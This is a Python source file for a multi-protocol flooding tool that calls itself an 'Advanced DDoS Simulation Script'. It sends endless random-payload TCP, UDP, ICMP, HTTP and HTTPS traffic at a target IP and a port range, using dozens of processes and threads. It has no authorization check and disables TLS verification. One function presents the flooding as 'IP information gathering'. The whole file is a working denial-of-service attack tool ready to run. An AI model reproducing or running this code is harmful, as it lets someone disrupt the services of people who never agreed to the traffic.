import random
import asyncio
import multiprocessing
import argparse
import os
import platform
import psutil
import selectors
import socket
import ssl
from aiohttp import ClientSession

# Constants for packet handling
SOCK_BUFFER_SIZE = 1024 * 1024  # 1 MB
MAX_UDP_PACKET_SIZE = 65507  # Max size for UDP
MAX_TCP_PACKET_SIZE = 1024 * 1024  # 1MB for TCP
MAX_HTTP_PACKET_SIZE = 1024  # 1KB for HTTP(S)

def setup_uvloop():
    """Attempt to set up uvloop if available; otherwise, fallback to asyncio."""
    if platform.system() != 'Windows':
        try:
            import uvloop
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        except ImportError:
            pass  # Ignore if uvloop is not available
        except Exception as e:
            print(f"[ERROR] Unable to set up uvloop: {e}")

def randomize_cpu_affinity():
    """Randomize CPU affinity for load distribution, handling errors gracefully."""
    current_pid = os.getpid()
    try:
        cpu_count = os.cpu_count()
        if not cpu_count:
            print("[WARNING] Unable to determine the number of CPUs.")
            return

        cpu_ids = random.sample(range(cpu_count), random.randint(1, cpu_count))
        if platform.system() in ['Linux', 'Android']:
            cpu_mask = sum(1 << cpu for cpu in cpu_ids)
            os.system(f'taskset -p {cpu_mask} {current_pid}')
            print(f"[INFO] Set CPU affinity mask to: {cpu_mask}")
        elif platform.system() == 'Windows':
            psutil.Process(current_pid).cpu_affinity(cpu_ids)
            print(f"[INFO] Set CPU affinity to: {cpu_ids}")
        else:
            print(f"[WARNING] CPU affinity setting not supported on this platform: {platform.system()}")
    except psutil.AccessDenied:
        print("[ERROR] Access denied to set CPU affinity. Run with elevated permissions.")
    except Exception as e:
        print(f"[ERROR] Exception occurred while setting CPU affinity: {e}")

async def send_tcp_packet(target, port, selector, packet_size=MAX_TCP_PACKET_SIZE):
    """Asynchronous TCP packet sender with error handling."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFFER_SIZE)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFFER_SIZE)
        sock.setblocking(False)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            sock.connect((target, port))
        except BlockingIOError:
            pass  # Non-blocking connect

        selector.register(sock, selectors.EVENT_WRITE)
        data = random._urandom(packet_size)

        while True:
            events = selector.select(timeout=0.01)
            for key, _ in events:
                try:
                    sock.send(data)
                except (ConnectionRefusedError, OSError) as e:
                    print(f"[ERROR] TCP connection error: {e}")
                    return  # Exit on connection error
    except Exception as e:
        print(f"[ERROR] Exception in TCP sending: {e}")
    finally:
        try:
            selector.unregister(sock)
            sock.close()
        except Exception as e:
            print(f"[ERROR] Exception closing TCP socket: {e}")

async def send_udp_packet(target, port, packet_size=MAX_UDP_PACKET_SIZE):
    """Asynchronous UDP packet sender with error handling."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFFER_SIZE)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFFER_SIZE)
        sock.setblocking(False)
        data = random._urandom(packet_size)

        while True:
            try:
                sock.sendto(data, (target, port))
                await asyncio.sleep(0.0001)  # Small delay to prevent CPU hogging
            except OSError as e:
                print(f"[ERROR] UDP socket error: {e}")
                break
    except Exception as e:
        print(f"[ERROR] Exception in UDP sending: {e}")
    finally:
        try:
            sock.close()
        except Exception as e:
            print(f"[ERROR] Exception closing UDP socket: {e}")

async def send_icmp_packet(target):
    """Asynchronous ICMP packet sender with error handling."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00'  # ICMP Echo Request
            while True:
                sock.sendto(packet, (target, 0))
                await asyncio.sleep(0.01)  # Frequency control for ICMP
    except Exception as e:
        print(f"[ERROR] Exception in ICMP sending: {e}")

async def send_https_request(target, port, packet_size=MAX_HTTP_PACKET_SIZE):
    """Asynchronous HTTPS request sender with error handling."""
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    url = f"https://{target}:{port}"
    async with ClientSession() as session:
        data = random._urandom(packet_size)
        while True:
            try:
                async with session.post(url, data=data, ssl=ssl_context) as response:
                    await response.read()
            except Exception as e:
                print(f"[ERROR] HTTPS request error: {e}")
                await asyncio.sleep(0.01)

async def send_http_request(target, port, packet_size=MAX_HTTP_PACKET_SIZE):
    """Asynchronous HTTP request sender with error handling."""
    url = f"http://{target}:{port}"
    async with ClientSession() as session:
        data = random._urandom(packet_size)
        while True:
            try:
                async with session.post(url, data=data) as response:
                    await response.read()
            except Exception as e:
                print(f"[ERROR] HTTP request error: {e}")
                await asyncio.sleep(0.01)

def parse_ports(port_input):
    """Parse a port input as single, range, or multiple ports."""
    try:
        if '-' in port_input:
            start, end = map(int, port_input.split('-'))
            return list(range(start, end + 1))
        elif ',' in port_input:
            return list(map(int, port_input.split(',')))
        else:
            return [int(port_input)]
    except ValueError as e:
        print(f"[ERROR] Exception parsing ports: {e}")
        return []

def run_ip_info(ip_address, port, num_processes, num_threads_per_process, protocol, packet_size):
    """Run IP information gathering with asynchronous packet sending."""
    randomize_cpu_affinity()
    setup_uvloop()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    tasks = []
    if protocol == 'TCP':
        tasks = [send_tcp_packet(ip_address, port, selectors.DefaultSelector(), packet_size) for _ in range(num_threads_per_process)]
    elif protocol == 'UDP':
        tasks = [send_udp_packet(ip_address, port, packet_size) for _ in range(num_threads_per_process)]
    elif protocol == 'ICMP':
        tasks = [send_icmp_packet(ip_address)]
    elif protocol == 'HTTPS':
        tasks = [send_https_request(ip_address, port, packet_size)]
    elif protocol == 'HTTP':
        tasks = [send_http_request(ip_address, port, packet_size)]

    try:
        loop.run_until_complete(asyncio.gather(*tasks))
    except Exception as e:
        print(f"[ERROR] Exception during async tasks: {e}")
    finally:
        loop.close()

def main():
    parser = argparse.ArgumentParser(
        description='Advanced DDoS Simulation Script with Robust Error Handling',
        usage="%(prog)s -ip <TARGET_IP> -p <PORT> [options]"
    )
    parser.add_argument('-ip', required=True, help='Target IP address')
    parser.add_argument('-p', help='Target port (can be a single port, range, or multiple ports)')
    parser.add_argument('-T', action='store_true', help='Use TCP protocol')
    parser.add_argument('-H', action='store_true', help='Use HTTP protocol')
    parser.add_argument('-S', action='store_true', help='Use HTTPS protocol')
    parser.add_argument('-I', action='store_true', help='Use ICMP protocol')
    parser.add_argument('-U', action='store_true', help='Use UDP protocol')
    parser.add_argument('-A', action='store_true', help='Run all protocols in parallel')
    parser.add_argument('-pr', default=30, type=int, help='Number of processes to run in parallel')
    parser.add_argument('-t', default=40, type=int, help='Number of threads per process')
    parser.add_argument('-ps', default=MAX_UDP_PACKET_SIZE, type=int, help='Packet size for the stress test')

    args = parser.parse_args()
    ip_address = args.ip
    num_processes = args.pr
    num_threads_per_process = args.t
    packet_size = args.ps

    protocols = []
    ports = {}

    if args.A:
        if args.p:
            port_list = parse_ports(args.p)
            protocols = ['TCP', 'UDP', 'ICMP', 'HTTPS', 'HTTP']
            for protocol in protocols:
                ports[protocol] = port_list if protocol != 'ICMP' else [0]
    else:
        if args.T: protocols.append('TCP')
        if args.U: protocols.append('UDP')
        if args.I: protocols.append('ICMP')
        if args.H: protocols.append('HTTP')
        if args.S: protocols.append('HTTPS')

        if args.p:
            for protocol in protocols:
                ports[protocol] = parse_ports(args.p)

    for protocol in protocols:
        for port in ports.get(protocol, []):
            processes = []
            for _ in range(num_processes):
                process = multiprocessing.Process(
                    target=run_ip_info,
                    args=(ip_address, port, num_processes, num_threads_per_process, protocol, packet_size)
                )
                process.start()
                processes.append(process)
            for process in processes:
                process.join()

if __name__ == "__main__":
    main()
